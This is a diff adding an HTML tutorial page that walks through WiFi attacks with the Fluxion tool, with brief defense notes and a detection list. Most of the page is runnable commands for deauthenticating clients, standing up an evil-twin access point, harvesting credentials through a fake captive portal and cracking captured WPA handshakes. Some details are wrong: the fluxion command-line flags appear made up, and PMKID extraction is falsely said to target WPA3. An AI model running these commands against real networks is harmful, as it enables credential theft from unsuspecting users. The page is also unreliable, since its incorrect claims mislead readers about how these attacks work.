@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fluxion WiFi Attack Tool | TKhoa's Cybersecurity Library</title>
+    <link rel="stylesheet" href="../style.css">
+</head>
+<body>
+    <div class="page">
+        <header>
+            <h1>Fluxion - Advanced WiFi Attack GUI</h1>
+            <p>Fluxion is a graphical wireless penetration testing tool that automates WiFi attacks. Document its capabilities for authorized red team exercises and defensive awareness.</p>
+        </header>
+
+        <section class="card">
+            <h2>Installation</h2>
+            <pre><code>sudo git clone https://github.com/FluxionNetwork/fluxion.git
+cd fluxion
+sudo chmod +x fluxion.sh
+sudo bash fluxion.sh</code></pre>
+            <p><strong>Defense:</strong> Monitor for cloning FluxionNetwork repositories and execution of fluxion.sh scripts.</p>
+        </section>
+
+        <section class="card">
+            <h2>Launch Fluxion Interface</h2>
+            <pre><code>sudo ./fluxion.sh</code></pre>
+            <p>Launches interactive menu-driven WiFi attack interface with visual feedback.</p>
+        </section>
+
+        <section class="card">
+            <h2>Select Wireless Interface</h2>
+            <pre><code>sudo ifconfig</code></pre>
+            <p>Identify available network interfaces before launching Fluxion. Choose adapter with strong injection support.</p>
+        </section>
+
+        <section class="card">
+            <h2>Enable Monitor Mode</h2>
+            <pre><code>sudo airmon-ng start wlan0
+sudo ip link set wlan0mon up</code></pre>
+            <p>Fluxion requires monitor mode. Defenders should detect monitor mode activation as potential threat indicator.</p>
+        </section>
+
+        <section class="card">
+            <h2>Network Scanning Phase</h2>
+            <pre><code>sudo airodump-ng --output-format csv -w /tmp/fluxion-scan wlan0mon
+cat /tmp/fluxion-scan-01.csv</code></pre>
+            <p>Scan and list all available WiFi networks. Fluxion automates this for target selection.</p>
+        </section>
+
+        <section class="card">
+            <h2>Select Target Network</h2>
+            <p>Fluxion workflow:</p>
+            <pre><code>1. Choose "Scan for networks"
+2. Select target SSID from list
+3. Select channel number
+4. Proceed to attack selection</code></pre>
+            <p>Always verify authorization before targeting any network.</p>
+        </section>
+
+        <section class="card">
+            <h2>Handshake Capture Method</h2>
+            <pre><code>sudo airodump-ng -c CHANNEL -b BSSID -w /tmp/fluxion-hs wlan0mon
+sudo aireplay-ng --deauth 5 -a BSSID wlan0mon</code></pre>
+            <p>Fluxion automates WPA/WPA2 handshake capture with optional deauth acceleration.</p>
+        </section>
+
+        <section class="card">
+            <h2>Evil Twin (Rogue AP) Mode</h2>
+            <pre><code>sudo hostapd -B /etc/hostapd/hostapd.conf
+sudo dnsmasq -c /etc/dnsmasq.conf
+sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE</code></pre>
+            <p><strong>Red Team:</strong> Create identical fake access point with superior signal.</p>
+            <p><strong>Blue Team Defense:</strong> Educate users on network selection; implement 802.11i on all networks.</p>
+        </section>
+
+        <section class="card">
+            <h2>Captive Portal Creation</h2>
+            <pre><code>sudo fluxion --portal-auto-setup
+# Fluxion generates fake login page</code></pre>
+            <p>Fluxion auto-creates convincing login portal to capture credentials. Users redirected to portal on connection.</p>
+        </section>
+
+        <section class="card">
+            <h2>Credential Harvesting</h2>
+            <pre><code>cat /tmp/fluxion-credentials.txt
+# Captured usernames and passwords stored</code></pre>
+            <p><strong>Defense:</strong> Teach users to verify certificate authenticity and avoid clicking "Accept" on suspicious portals.</p>
+        </section>
+
+        <section class="card">
+            <h2>Wordlist Dictionary Attack Mode</h2>
+            <pre><code>sudo fluxion --attack-type wordlist
+# Select wordlist: /usr/share/wordlists/rockyou.txt
+# Select captured handshake file</code></pre>
+            <p>Automates hashcat/aircrack-ng integration for password cracking after handshake capture.</p>
+        </section>
+
+        <section class="card">
+            <h2>WPA/WPA2 Bruteforce Attack</h2>
+            <pre><code>sudo aircrack-ng -b BSSID -w /usr/share/wordlists/rockyou.txt /tmp/fluxion-hs-01.cap</code></pre>
+            <p>Offline bruteforce attempt on captured handshake. Defenders: Enforce 16+ character passwords with complexity.</p>
+        </section>
+
+        <section class="card">
+            <h2>Network Monitor/Sniffer Mode</h2>
+            <pre><code>sudo tcpdump -i wlan0mon -w /tmp/traffic-capture.pcap 'not (arp or icmp)'
+sudo wireshark /tmp/traffic-capture.pcap</code></pre>
+            <p>Fluxion can capture network traffic to analyze unencrypted communications.</p>
+        </section>
+
+        <section class="card">
+            <h2>PMKID Extraction (WPA3 Networks)</h2>
+            <pre><code>sudo hcxdumptool -i wlan0mon --active_beacon -o /tmp/pmkid.pcap
+# Fluxion auto-processes for hashcat attack</code></pre>
+            <p>Modern method targeting even WPA3 networks. Defense: WPA3 brute force significantly slower than WPA2.</p>
+        </section>
+
+        <section class="card">
+            <h2>Log Export and Analysis</h2>
+            <pre><code>sudo ls -la /tmp/fluxion*/
+sudo cat /tmp/fluxion-*/logs/*</code></pre>
+            <p>Fluxion stores captured data, credentials, and logs in temp directories. Clean up after testing.</p>
+        </section>
+
+        <section class="card">
+            <h2>Cleanup and Restore</h2>
+            <pre><code>sudo airmon-ng stop wlan0mon
+sudo systemctl restart networking
+sudo killall hostapd dnsmasq
+sudo iptables -t nat -F</code></pre>
+            <p>Restore normal operations after test completion.</p>
+        </section>
+
+        <section class="card">
+            <h2>Blue Team: Detection Strategy</h2>
+            <p><strong>Network-Based Detection:</strong></p>
+            <ul>
+                <li>Alert on SSID cloning or duplicate network names with stronger signal</li>
+                <li>Monitor for suspicious captive portal redirects (HTTP instead of HTTPS)</li>
+                <li>Detect certificate mismatch warnings in browser traffic</li>
+                <li>Identify mass client deauthentication events</li>
+                <li>Log all failed WPA/WPA2 authentication attempts</li>
+            </ul>
+            <p><strong>Host-Based Detection:</strong></p>
+            <ul>
+                <li>Monitor for airodump-ng, airmon-ng, hostapd processes</li>
+                <li>Alert on monitor mode interface creation</li>
+                <li>Track tcpdump or packet capture tool execution</li>
+                <li>Flag DNS redirection or unknown DHCP servers</li>
+            </ul>
+        </section>
+
+        <p class="note"><a href="index.html">← Back to Tool Awareness</a></p>
+    </div>
+</body>
+</html>
